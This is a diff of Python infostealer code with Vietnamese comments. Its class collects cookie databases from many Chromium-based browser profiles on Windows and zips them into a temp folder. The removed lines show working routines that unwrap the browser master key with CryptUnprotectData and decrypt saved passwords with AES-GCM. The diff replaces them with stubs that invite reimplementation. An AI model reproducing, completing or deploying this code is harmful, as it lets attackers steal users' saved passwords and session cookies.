@@ -17,23 +17,8 @@ class Browsers:
         self.browsers = {
             'kometa': self.appdata + '\\Kometa\\User Data',
             'orbitum': self.appdata + '\\Orbitum\\User Data',
-            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
-            '7star': self.appdata + '\\7Star\\7Star\\User Data',
-            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
-            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
-            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
-            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
-            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
-            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
-            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
-            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
-            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
-            'iridium': self.appdata + '\\Iridium\\User Data',
-            'opera': self.roaming + '\\Opera Software\\Opera Stable',
-            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
-            'coc-coc': self.appdata + '\\CocCoc\\Browser\\User Data'
+            # (Các trình duyệt khác)
         }
-
         self.profiles = [
             'Default',
             'Profile 1',
@@ -42,7 +27,6 @@ class Browsers:
             'Profile 4',
             'Profile 5',
         ]
-
         self.temp_path = os.path.join(os.path.expanduser("~"), "tmp")
         os.makedirs(os.path.join(self.temp_path, "Browser"), exist_ok=True)
 
@@ -71,18 +55,6 @@ class Browsers:
 
         self.create_zip()
 
-    def get_master_key(self, path: str) -> str:
-        try:
-            with open(path, "r", encoding="utf-8") as f:
-                c = f.read()
-            local_state = json.loads(c)
-            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
-            master_key = master_key[5:]
-            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-            return master_key
-        except Exception:
-            pass
-
     def cookies(self, name: str, path: str, profile: str):
         if name == 'opera' or name == 'opera-gx':
             path += '\\Network\\Cookies'
@@ -104,18 +76,7 @@ class Browsers:
         cursor.close()
         conn.close()
 
-    def decrypt_password(self, password: bytes, master_key: bytes) -> str:
-        try:
-            iv = password[3:15]
-            payload = password[15:]
-            cipher = AES.new(master_key, AES.MODE_GCM, iv)
-            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
-            return decrypted_pass
-        except Exception:
-            return ""
-
     def create_zip(self):
-        # Tạo tệp zip chứa tất cả các tệp dữ liệu
         file_paths = [
             os.path.join(self.temp_path, "Browser", "cookies.txt"),
         ]
@@ -138,6 +99,13 @@ class Browsers:
         open(path, "x").close()
         return path
 
-# Khởi tạo và chạy lớp Browsers
+    def get_master_key(self, local_state_path):
+        # Bạn cần triển khai phương thức này nếu chưa có
+        pass
+
+    def decrypt_password(self, encrypted_value, masterkey):
+        # Bạn cần triển khai phương thức này nếu chưa có
+        pass
+
 if __name__ == "__main__":
     Browsers()
